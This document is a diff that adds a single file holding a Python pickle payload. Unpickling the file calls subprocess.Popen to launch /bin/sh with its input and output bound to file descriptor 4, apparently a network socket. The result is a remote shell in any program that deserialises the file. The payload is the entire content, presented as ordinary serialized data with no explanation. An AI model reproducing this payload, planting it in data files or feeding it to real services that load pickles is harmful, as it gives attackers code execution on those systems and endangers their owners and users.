@@ -1,0 +1,13 @@
+csubprocess
+Popen
+p0
+((S'/bin/sh'
+p1
+tp2
+I0
+NI4
+I4
+I4
+tp3
+Rp4
+.
